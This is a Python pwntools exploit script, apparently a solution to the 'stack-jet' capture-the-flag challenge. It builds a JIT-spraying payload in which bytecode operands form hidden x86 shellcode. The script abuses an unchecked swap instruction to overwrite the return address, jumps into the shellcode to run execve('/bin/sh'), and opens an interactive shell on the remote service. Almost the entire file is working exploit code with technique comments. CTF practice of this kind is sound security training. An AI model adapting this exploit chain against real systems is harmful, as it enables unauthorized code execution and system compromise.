#!/usr/bin/env python3

from pwn import *

exe = ELF("./stack-jet_patched")

context.binary = exe

# split tmux pane
#context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]
context.terminal = ["tmux", "neww", "-n", "shell"]
#context.log_level = "debug"
context.aslr = False
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc stack-jet.challs.cyberchallenge.it 9604"	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b *jit_run+11 
c
"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

'''
	jit spraying attack: jump in the middle of 
	fixed shellcode and executed your crafted shellcode 
	ex: mov rbx, 0x3bb8 -> jump to 0xb83b = opcodes for mov rax -> mov rax
	see opcodes at: https://defuse.ca/online-x86-assembler.htm
'''


'''
	can't have more than one pushed value on the stack, 
	always have to do pop of the previous pushed value before pushing something new
	
	swap (0x3) = swap rax, rdi -> vuln: no check in swap on the stack,
	(if i haven't pushed 2 values)
	-> push only 1 value, then swap so rsp=stack addr 
	
	at code end, there is ret so i have a jmp at arb addr 
	(modify the stack addr on rsp with add/sub)
'''

instr = {
	"push" : b'\x00',
	"pop" : b'\x01',
	"dup" : b'\x02', # duplicates stack value
	"swap" : b'\x03',
	"add" : b'\x04',
	"sub" : b'\x05',
}



def main():

	'''
    set retaddr: 
		instr["push"], 
		value,
		instr["swap"], # swap to edit rip 
		instr["push"],
		offset,
		instr["add/sub"], # edit rip
		instr["swap"], #swap and ret to arb rip
	'''


	'''
	shellcode to call execve:
	mov edi, binsh 
	xor esi,esi 
	xor edx,edx
	mov eax, 0x3b 
	syscall 
	'''

	code= 0
	binsh = "/bin/sh\x00".encode() 

	code = flat(
			instr["push"], # push shellcode 1st part
			asm('xor esi,esi'),
			asm('pop rdi; mov [rdi],rax'), # rdi = addr of /bin/sh
			b'\xb8\x3b', # mov eax,...

			# when executing crafted shellcode, these will just be fillers to reach 4 bytes
			instr["pop"], # pop to clear stack
			instr["push"], # push 2nd part

			p32(0x3b), # ..., 0x3b (mov eax, 0x3b is splitted)
			asm("xor edx,edx"), # edx = 0
			asm("syscall"), # syscall (execve) 
			instr['pop'], # pop to clear stack 
			instr["push"], # push binsh on the stack (then will be stored in rax)
			binsh,
			instr["swap"], # swap to have stack addr on rsp 
			instr["push"],
			p64(11),
			instr["add"], # add 11 to rsp (addr of crafted shellcode)
			instr["swap"], # swap and ret to shellcode (at xor esi,esi)
			# ret to xor esi,esi
		)

	sl("0")
	sl(str(len(code)))
	sn(code)

	r.interactive()


if __name__ == "__main__":
    main()
